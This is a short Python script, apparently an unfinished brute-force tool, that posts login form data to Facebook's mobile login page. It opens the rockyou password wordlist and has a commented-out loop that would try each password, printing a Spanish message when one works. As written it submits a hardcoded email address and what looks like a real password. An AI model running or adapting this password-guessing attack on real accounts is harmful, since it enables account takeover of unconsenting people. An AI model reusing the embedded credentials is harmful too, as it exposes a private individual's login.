import requests

url = 'http://mbasic.facebook.com/login.php'
arg = open('rockyou2.txt','r')
#for line in arg:
#	password = line.strip()
http = requests.post(url, data={'form1':'ivca2ro@hotmail.com','form2':'$n$$n$1987!','sub':'submit'})
content = http.content
print(content)
	#break
	#b = bytes("pensando", 'utf-8')
	#if  b in content:
		#print("tu clave fue encontrada niño")
		#break